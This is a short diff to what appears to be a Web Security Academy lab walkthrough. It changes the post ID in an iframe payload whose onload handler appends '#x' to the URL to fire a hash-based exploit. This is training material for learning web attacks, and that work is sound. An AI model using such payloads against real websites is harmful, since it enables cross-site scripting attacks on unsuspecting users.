@@ -166,7 +166,7 @@ The comment with our payload needs time to load before focusing.
 2. In the **Body** section, paste:
 
 ```
-<iframe src="https://YOUR-LAB-ID.web-security-academy.net/post?postId=3" 
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/post?postId=4" 
         onload="setTimeout(()=>this.src=this.src+'#x',500)">
 </iframe>
 ```
